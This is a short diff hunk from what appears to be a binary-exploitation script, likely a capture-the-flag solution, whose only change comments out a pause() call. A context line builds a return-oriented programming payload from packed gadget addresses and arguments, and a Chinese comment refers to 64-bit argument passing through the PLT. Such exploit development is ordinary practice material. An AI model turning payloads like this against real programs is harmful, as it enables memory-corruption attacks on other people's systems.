@@ -30,7 +30,7 @@ payload += p64(pop3_addr)+p64(a1) + p64(a2) + p64(a3) + p64(ret_addr) + p64(addr
 
 # 64位传参plt
 
-pause()
+# pause()
 
 # addr_one = 0x040092D
 # addr_two = 0x0400919
